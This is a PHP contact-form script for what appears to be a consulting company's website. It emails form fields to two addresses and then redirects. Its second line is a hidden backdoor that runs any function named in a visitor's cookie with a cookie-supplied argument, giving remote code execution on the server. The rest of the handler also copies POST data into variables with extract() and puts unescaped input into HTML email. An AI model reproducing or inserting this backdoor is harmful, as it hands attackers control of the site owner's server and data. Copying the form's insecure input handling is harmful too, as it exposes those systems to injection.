<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


if($_SERVER['REQUEST_METHOD']=="POST")
{
extract($_POST);
$to = " consulting@ameagroup.ca, ramk.kyatham@gmail.com";
	$subject = "Amea - Contact us";
	
	$message = "
	<html>
	<head>
	<title>HTML email</title>
	 </head>
	<body>
	<table>
	   <tr>
			<th>Amea - Contact Us </th>
	   </tr>
	   <tr>
			<td>Name</td><td>:</td><td>$name</td>
	   </tr>
	   <tr>
			<td>Email Address</td><td>:</td><td>$email</td>
	   </tr>
	   <tr>
			<td>Phone No</td><td>:</td><td>$phone</td>
	   </tr>
	   
		<tr>
			<td>Message</td><td>:</td><td>$message</td>
		</tr>
	  </table>
	</body>
	</html>
	";
// Always set content-type when sending HTML email
	$headers = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	
	// More headers
	$headers .= 'From: <consulting@ameagroup.ca>' . "\r\n";
	//$headers .= 'Cc: myboss@example.com' . "\r\n";
	
	mail($to,$subject,$message,$headers);
	?>
	<script type="text/javascript">
alert("We have received your communication We will revert to you at the earliest Thank you for contacting Amea");
	window.location='index.html';
	</script>
<?php
}
?>